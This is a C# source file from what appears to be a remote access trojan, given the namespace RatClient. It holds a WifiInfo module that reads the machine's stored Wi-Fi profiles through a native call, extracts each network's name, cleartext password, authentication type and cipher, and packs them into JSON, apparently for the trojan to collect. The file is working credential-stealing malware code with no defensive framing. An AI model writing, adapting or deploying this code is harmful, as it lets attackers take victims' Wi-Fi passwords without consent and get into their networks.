using RatClient.WifiGather;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Xml;
using System.Text.Json;

namespace RatClient.Mtool
{
	class WifiInfo
	{
		private XmlDocument xmlDoc;
		private string resultInfoFull;
		private string NameSpaceUrl;
		private XmlNamespaceManager namespaceManager;
		private const string NAME_SPACE = "ns";

		public WifiInfo()
		{
			xmlDoc = new XmlDocument();
			this.resultInfoFull = null;
		}
		private void SetInfoFull()
		{
			IntPtr bufferPtr;
			int length;
			NativeMethods.getWifiProfiles(out bufferPtr, out length);
			byte[] data = new byte[length];
			Marshal.Copy(bufferPtr, data, 0, length);
			resultInfoFull = Encoding.UTF8.GetString(data);
			NativeMethods.deleteBuffer(bufferPtr);
		}
		private WifiuniqSerialized ParseProfile(string profileXml)
		{
			xmlDoc.LoadXml(profileXml);
			if (xmlDoc.DocumentElement.NamespaceURI != NameSpaceUrl)
			{
				NameSpaceUrl = xmlDoc.DocumentElement.NamespaceURI;
				namespaceManager = new XmlNamespaceManager(xmlDoc.NameTable);
				namespaceManager.AddNamespace("ns", xmlDoc.DocumentElement.NamespaceURI);
			}
			string SSIDName = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:name", namespaceManager)?.InnerText ?? "";
			string Password = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:keyMaterial", namespaceManager)?.InnerText ?? "";
			string Authentication = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:authentication", namespaceManager)?.InnerText ?? "";
			string Cipher = xmlDoc.SelectSingleNode($"//{NAME_SPACE}:encryption", namespaceManager)?.InnerText ?? "";
			return new WifiuniqSerialized(SSIDName, Password, Authentication, Cipher);
		}


		public string GetJsonInfo()
		{
			if (resultInfoFull == null)
			{
				SetInfoFull();
			}
			WifiStringInfoParser parser = new WifiStringInfoParser(resultInfoFull);
			Dictionary<string, string[]> dictParsed = parser.ToDict();
			List<WifiInterfaceInfo> fullRes = new List<WifiInterfaceInfo>();
			foreach (string i in  dictParsed.Keys)
			{
				List<WifiuniqSerialized> profiles = new List<WifiuniqSerialized>();
				foreach (string n in dictParsed[i])
				{
					profiles.Add(ParseProfile(n));
				}
				WifiInterfaceInfo interfaceFull = new WifiInterfaceInfo(i, profiles.ToArray());
				fullRes.Add(interfaceFull);
			}
			WifiFullSerialized fullResSerialized = new WifiFullSerialized(fullRes.ToArray());
			return JsonSerializer.Serialize(fullResSerialized);
		}
	}
}
